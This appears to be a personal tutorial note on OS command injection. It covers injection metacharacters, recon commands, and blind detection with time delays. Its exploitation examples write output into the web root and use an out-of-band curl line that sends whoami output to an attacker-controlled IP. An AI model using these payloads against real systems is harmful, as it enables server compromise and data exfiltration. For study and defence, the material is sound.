# OS Command Injection
> Raj Pastagiya | 29/10/2023

## What is OS command injection?
- Allows attacker to execute operating system commands on the server.
- Typically fully compromise the application and data.

## Injecting OS Commands
- In below example, there is an ed-tech portal where the application lets the user to view course details with below API call:
```
https://www.myedtech.com/courses.php?courseID=381
```
- To provide the course details, the application must query legacy script (coursedetails.pl) and is implemented by calling oout a shell command with the courseID as arguments like this: `coursedetails.pl 381` 
	- This command outputs the course details which is return to the user.
- If there is no input validation mechanisms, then one can abuse this to inject shell commands.
## Useful Commands:
- Below is some useful commands which in general is allowed to run by any users and which will stand as a proof of concept for the OS command injection attack.

| Purpose of Command | Linux | Windows |
| ---- | ---- | ---- |
| Name of current user | `whoami` or `id` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network Configurations | `ifconfig` or `ip a` | `ipconfig /all` |
| Open Ports| `netstat -natup` or `ss -lntp` | `netstat -natup` |
| Sleep for 10 seconds | `sleep 10` | `timeout -t 10` |

- With above some basic commands like `ls`, `cat`, `echo` in Linux and its equivalent Windows commands like: `dir`, `type`, `echo` also can be helpful.

## Ways of injecting OS commands
- One can use a number of shell meta-characters to perform OS command injection attacks:
- Below characters will work on both Windows and Linux:
```
&
&&
|
||
```
- The following command separators will work specifically on Unix systems:
```
;
0x0a
`<cmd>`
$(<cmd>)
```
> NOTE: Sometimes just like SQL Injection techniques, one must terminate the quotes (" or ') before injecting commands.

## Blind OS command injection vulnerabilities
- Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.
- As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details:
```
mail -s "Test" -aFrom:peter@user.net feedback@website.com
```

- The output from the `mail` command (if any) is not returned in the application's responses, so using the `echo` payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.

#### Detecting blind OS command injection using time delays
- With time delays, we can correspond to "If the delay in response is X then command executed, else not" kind of nature.
- Here we can use "sleep X" or "ping -c X 127.0.0.1" commands.

#### Exploiting blind OS command injection by redirecting output
- Now to exploit the vulnerability where blind command injection is there, one approach is to redirect the output of the commands we execute to the directory of the hosted server.
	- Here we are assuming that we know which directory is hosted by the webserver.
	- Once we redirect the output, since it is written in the same directory which is hosted by server, we can just navigate to the file from webserver itself.
- Example (Assumption is the site is hosted for directory /var/www/html/):
```
whoami > /var/www/html/whoami.txt
```
- If above is used, then go to http://www.vulnerabl-site.com/hello.txt

#### Exploiting blind OS command injection using out-of-band (OAST) techniques
- You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.
- For example if we can reach to our localhost(IP:10.10.10.10) somehow then host python3 HTTP server on localhost and then inject command:
```
curl http://10.10.10.10/index.php?var=`whoami`
```
- Here no need to create sophisticated servers, just  python HTTP server will also work.